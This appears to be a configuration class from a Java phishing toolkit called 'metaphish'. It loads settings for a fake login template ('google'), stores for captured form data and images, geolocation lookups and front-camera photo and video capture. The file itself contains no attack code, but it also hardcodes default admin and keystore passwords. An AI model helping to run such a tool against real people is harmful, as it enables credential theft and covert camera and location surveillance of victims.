package com.metaphish.config;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Properties;

public final class AppConfig {
    public String ServerHost;
    public int ServerPort;
    public boolean SslEnabled;
    public String SslKeystorePath;
    public String SslKeystorePassword;
    public String DefaultTemplate;
    public String AdminUsername;
    public String AdminPassword;
    public String CaptureFilePath;
    public String FormCaptureFilePath;
    public String ImagesDirectory;
    public String ReportDirectory;
    public String LogFilePath;
    public String LogLevel;
    public int    ApiTimeoutSeconds;
    public int    RevealDelaySeconds;
    public String CameraMode;
    public String VideoSource;
    public int    VideoDuration;

    public AppConfig(String ConfigFilePath) {
        Properties Props = new Properties();

        try (InputStream Stream = new FileInputStream(ConfigFilePath)) {
            Props.load(Stream);
        } catch (IOException Ignored) {
            try (InputStream Stream = AppConfig.class.getClassLoader().getResourceAsStream("metaphish.properties")) {
                if (Stream != null) Props.load(Stream);
            } catch (IOException AlsoIgnored) {}
        }

        ServerHost            = Props.getProperty("server.host", "0.0.0.0");
        ServerPort            = Integer.parseInt(Props.getProperty("server.port", "8080"));
        SslEnabled            = Boolean.parseBoolean(Props.getProperty("server.ssl.enabled", "false"));
        SslKeystorePath       = Props.getProperty("server.ssl.keystore.path", "data/ssl/metaphish.p12");
        SslKeystorePassword   = Props.getProperty("server.ssl.keystore.password", "metaphish");
        DefaultTemplate       = Props.getProperty("template.default", "google");
        AdminUsername         = Props.getProperty("admin.username", "admin");
        AdminPassword         = Props.getProperty("admin.password", "metaphish");
        CaptureFilePath       = Props.getProperty("capture.file", "data/Captures.jsonl");
        FormCaptureFilePath   = Props.getProperty("form.capture.file", "data/FormCaptures.jsonl");
        ImagesDirectory       = Props.getProperty("images.dir", "data/images");
        ReportDirectory       = Props.getProperty("report.dir", "reports");
        LogFilePath           = Props.getProperty("log.file", "logs/metaphish.log");
        LogLevel              = Props.getProperty("log.level", "INFO");
        ApiTimeoutSeconds     = Integer.parseInt(Props.getProperty("api.geolocation.timeout", "10"));
        RevealDelaySeconds    = Integer.parseInt(Props.getProperty("reveal.delay.seconds", "0"));
        CameraMode            = Props.getProperty("camera.mode", "front");
        VideoSource           = Props.getProperty("video.source", "front");
        VideoDuration         = Integer.parseInt(Props.getProperty("video.duration", "10"));
    }

    public void Override(String Key, String Value) {
        switch (Key) {
            case "host"           -> ServerHost      = Value;
            case "port"           -> ServerPort       = Integer.parseInt(Value);
            case "ssl"            -> SslEnabled       = Boolean.parseBoolean(Value);
            case "template"       -> DefaultTemplate  = Value;
            case "username"       -> AdminUsername    = Value;
            case "password"       -> AdminPassword    = Value;
            case "log-level"      -> LogLevel         = Value;
            case "camera-mode"    -> CameraMode       = Value;
            case "video-source"   -> VideoSource      = Value;
            case "video-duration" -> VideoDuration    = Integer.parseInt(Value);
        }
    }
}
